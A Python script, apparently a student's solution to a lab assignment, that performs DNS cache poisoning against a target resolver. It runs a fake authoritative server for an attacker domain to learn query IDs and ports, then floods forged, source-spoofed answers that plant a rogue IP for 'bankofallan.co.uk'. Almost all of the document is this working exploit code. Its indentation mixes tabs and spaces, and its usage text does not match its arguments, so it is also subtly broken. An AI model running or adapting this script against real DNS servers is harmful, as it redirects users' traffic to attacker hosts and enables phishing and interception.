from scapy.all import *
from socket import *

import time
import sys
import threading
import os


# read the 'main' method comments below, for a brief description on how this script works



########################################## SETTINGS ####################################################################################################################################################
# In order to customize the exploit, modify the following parameters
packetsToSend = 10						# packets to send before updating the current query ID used by the vulnerable server
increment = 10							# assuming qID is n, the flood of packets will start from qID = n+increment
LISTENER_PORT = 1337                    # this is the UDP port for receiving the secret
sourcePort = 53                         # default DNS port. This is used as binding port for the DNS server (thread dns) AND as a source port for forged DNS answers (thread flood)
filename = "current_qID.txt"
badguy_domain = "badguy.ru"							# this is the domain owned by the attacker. It is used to determine the current query ID used and the UDP source port used to send the query
answ_domain = "random.bankofallan.co.uk"			# the domain for which this script sends forged DNS answers with the aim to poison the vulnerables server's cache by guessing the correct queryID
additional_domain = "bankofallan.co.uk"				# the domain sent in bailwick

# this is hard-coded only for the purpose of the assignment. It can also be passed as cmdline argument.
sourceIP = '10.0.0.1'								# source IP for forged DNS packets -- this is the IP of the authoritative server for the bankofallan.co.uk domain name

##########################################################################################################################################################################################################


poisoned=0										# this variable becomes 1 iff an UDP packet is received on UDP LISTENER_PORT (ie when the secret is received).
# [***] NOTE THAT: even a simple port scan on the involved port will terminate the script.
# this has been implemented just for the assignment purpose.
# If you want to check that the listener is really listening on that port, please remember to restart the exploit script or it wouldn't give correct results about the received secret.



# this function returns true if the provided variable has a valid IP (v4) address format, false is returned otherwise.
def validate_ip(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True

'''
	This method sends a request to the vulnerable DNS, asking to resolve the domain owned by the attacker.
	This is done in order to update the current query ID used by the vulnerable server
	(since those requests are forwarded to us due to the recursive query bit set to true)
	and, consequently, for avoiding waste of time for testing query ID which will be (almost for sure) not the correct guess.
'''
def get_sourcep_queryID():
	os.system('dig ' + badguy_domain + ' @'+target_dns + ' 1 >/dev/null')
	with open(filename, 'r') as f:
		queryPort, queryID = f.read().split(',')

	return (int(queryPort), int(queryID))

'''
	This subroutine takes an array of UDP packets representing forged
    DNS answers and sends them to the vulnerable DNS server with the aim
    to win the race and poison the it's cache.
'''
def send_packets(packets):
	c = 0
	for udp_packet in packets:
		send(udp_packet, verbose=0)
		c += 1
		#print str(c) + " sent"

'''
	This method acts like an authoritative DNS  server
	for the attacker's domain, which is baduy.ru in this example
    in the assignment environment.
	Moreover, at every request it receives, it stores the value of
	DNS queryID and UDP source port used into a text file
	(in the same directory this script is located).
    Note the binding address, 0.0.0.0
'''
def dns():
	sock = socket(AF_INET, SOCK_DGRAM)
	sock.bind(('0.0.0.0', 53))
	print("[*] DNS SERVER STARTED\n")
	while poisoned != 1:
	    request, addr = sock.recvfrom(4096)

	    udp_sourceport = addr[1]

	    try:
	        dns = DNS(request)
	        queryID = dns.id
	        #print 'query ID: ' + str(queryID)
	        #assert dns.opcode == 0, dns.opcode
	        assert dnsqtypes[dns[DNSQR].qtype] == 'A', dns[DNSQR].qtype
	        query = dns[DNSQR].qname.decode('ascii')
	        if query[-1] == '.':
	            query = query[:-1]
	        #print 'query is: \'' + query + '\''
	        assert query == badguy_domain

	        response = DNS(
	            id=dns.id, ancount=1, qr=1, rd=0, aa=1,
	            an = DNSRR(rrname=str(query), type='A', rdata=rogueIP, ttl=3600)
	            )
	        sock.sendto(bytes(response), addr)
	    except Exception as e:
	        print("Error during DNS query handling")

		# writes the tuple (UDPport,queryID) into a regular file
	    with open(filename, 'w') as f:
	        f.write(str(udp_sourceport)+','+str(queryID))

'''
	This subroutine constatly forge packetsToSend DNS packets
	with a spoofed source IP address, the currently used UDP source port
	and DNS queryID.
	Once it's forged the packets, it sends them using the send_packets()
	subroutine, updates the current queryID and UDP source port, and then
	starts back considering the updated values.
'''
def flood():
	queryPort, queryID = get_sourcep_queryID()	# send a DNS query for badguy.ru in order to update the queryID currently used by the vulnerable server

	print("[*] Flooder started")
	#print 'start ID is: '+str(queryID)

	while poisoned != 1:
		i=0
		udp_packets = []
		#print '[***] Trying ID: ' + str(queryID)
		spoofing_set = range(queryID + increment, queryID + increment + packetsToSend)

		for dns_trans_id in spoofing_set:
			udp_packet = (
					IP(src=sourceIP, dst=target_dns)/
					UDP(sport=sourcePort, dport=queryPort)/
					DNS(id=dns_trans_id, rd=0, qd=DNSQR(qname=answ_domain), qr=1, aa=1, ra=0, z=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=1, ar=DNSRR(rrname=answ_domain, rdata=rogueIP, type="A", rclass="IN", ttl=3600))/
					DNSRR(rrname=additional_domain, rdata=rogueIP, type="A", rclass="IN", ttl=3600)
			)
			udp_packets.append(udp_packet)
		send_packets(udp_packets)
		print("[*] flooder is updating the current queryID...")
		queryPort, queryID = get_sourcep_queryID()
		#print 'query port: ' + str(queryPort)
		#print 'query ID: ' + str(queryID)

'''
	The sole purpose of this function is to wait for the secret
	sent by the vulnerable DNS server on successful cache poisoning.
	Once the secret is received, the global variable 'poisoned' is
	set to true, thus implying the attacks is terminated and every
	other thread should terminate.

	NOTE1: any received packet is considered to be THE secret.
	This means that every data sent to this port will terminate the entire
	exploit script. Regarding the assignment, seems that secrets are always 32 bytes long
	so a better approach would have been to consider an attack as succeeded
    only when such number of bytes is received.
    NOTE2: Note the binding address 0.0.0.0
'''
def listenForSecret(port):
	sock = socket(AF_INET, SOCK_DGRAM)
	sock.bind(('0.0.0.0', port))
	print("[*] LISTENER STARTED ON UDP PORT " + str(port))
	while True:
		#request, addr = sock.recvfrom(4096)
		data, addr = sock.recvfrom(4096)
		print("\n\nSECRET RECEIVED!!!!!\n\n")
		print(data)
		print('')
		global poisoned
		poisoned = 1
		break


'''
    The script takes 2 comman-line arguments:
        1 -- the IP of the target DNS server (the one that is reachable from the attacking/my machine)
        2 -- the IP address that the attacker want to inject for the target domain

    It returns with error code:
        2:  if input arguments are not enough
        3:  if input arguments are not valid

        0: if everything went fine


        Once this script is executed, it spawns 3 threads:

            - the authoritative DNS server for the badguy.ru domain name
            - a listener on UDP port 1337 for receiving the secret sent by the vulnerable server on successful cache poisoning
            - a thread that tries to poison the cache. After sending some packets with the aim to guess the current query ID used
                it updates the UDP source port and the query ID currently used for sending recursive query and then try to win the
                race again.

        When the secret is received the the attack (and the script) end.
'''
if __name__=='__main__':
	if len(sys.argv) != 3:
		print("[*] Usage: exploit.py [vulndns_IP] [interface]")
		sys.exit(2)
	else:
	    global rogueIP, target_dns
		target_dns = sys.argv[1]
		rogueIP = sys.argv[2]
		if not validate_ip(target_dns) or not validate_ip(rogueIP):
			print("[*] please enter some valid IP address.\nQuitting...")
			sys.exit(3)
	threads=[]
	threads.append(threading.Thread(target=dns))
	threads.append(threading.Thread(target=flood))
	threads.append(threading.Thread(target=listenForSecret, args=(LISTENER_PORT, )))
	for t in threads:
		t.daemon=True
		t.start()

	'''	NOTE: this is not the best way to end such a script.
	 	However, it works fine and every resource is properly releases (i.e. no orphan processes)
	'''
	while poisoned != 1:
		time.sleep(1)

	print("[*] Attack succeeded!")
    	sys.exit(0)
